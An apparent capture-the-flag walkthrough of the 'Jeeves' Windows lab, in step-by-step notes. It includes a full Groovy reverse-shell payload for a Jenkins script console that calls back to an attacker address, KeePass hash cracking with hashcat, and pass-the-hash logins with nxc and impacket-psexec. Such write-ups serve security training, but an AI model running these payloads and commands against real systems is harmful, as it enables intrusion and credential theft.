## Jeeves

### Lab Details 

- Difficulty: Medium
- Type: Web Enum, Jenkins, KeePass, Priv Esc, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

#### Initial Foothold 
- run `ffuf` on the other `HTTP` port on port 50000
```bash
$ ffuf -u http://10.129.195.125:50000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.195.125:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
:: Progress: [119600/119600] :: Job [1/1] :: 12500 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
- found `askjeeves` directory
- the port is running `jenkins`
- enumerate  `jenkins`, found that we are able to execute scripts via `/jeeves/scripts` endpoint
- be is reverse shell payload for `groovy`
```groovy script
String host="10.10.14.78";
int port=9000;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
- execute the command in the terminal and we get a reverse shell back on `nc`
![[Medium/Windows/Jeeves/initial foothold.png]]
#### Lateral Movement (If any)

#### Privilege Escalation
- search through user `kohsuke` directory, found a `KeePass` file at `C:\Users\kohsuke\Documents\CEH.kdbx`
- use `keepass2john` to get file hash `$ keepass2john CEH.kdbx > CDH.kdbx.hash`
- then decrypt the key with `hashcat`
```bash
$ hashcat -m 13400 --username CDH.kdbx.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting
<SNIP>
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
                                                          
Session..........: hashcat
Status...........: Cracked
<SNIP>
```
- use `kpcli` to enumerate the `KeePass` file
![[enum keepass.png]]
- we found the `NTLM` hash 
- we can attempt to check if we have admin access using `nxc`
```bash
$ nxc smb 10.129.195.125 -u administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMB         10.129.195.125  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.195.125  445    JEEVES           [+] Jeeves\administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```
- use `impacket-psexec` to get a reverse shell
```bash
$ impacket-psexec 'Administrator@10.129.195.125' -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.195.125.....
[*] Found writable share ADMIN$
[*] Uploading file XJnidNqw.exe
[*] Opening SVCManager on 10.129.195.125.....
[*] Creating service oojj on 10.129.195.125.....
[*] Starting service oojj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
- however there is no `root.txt` located at administrator's desktop
- instead there's a file called `hm.txt` and it states that flag is elsewhere
```
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```
- run `dir /R` to reveals files hidden in alternate data streams
```cmd
C:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,646,798,336 bytes free
```
- use `powershell`  to read the `root.txt` on alternative data stream
```powershell
Get-Content -Path "hm.txt" -Stream "root.txt"

## or 

powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```
#### Resources

#### Lesson Learned
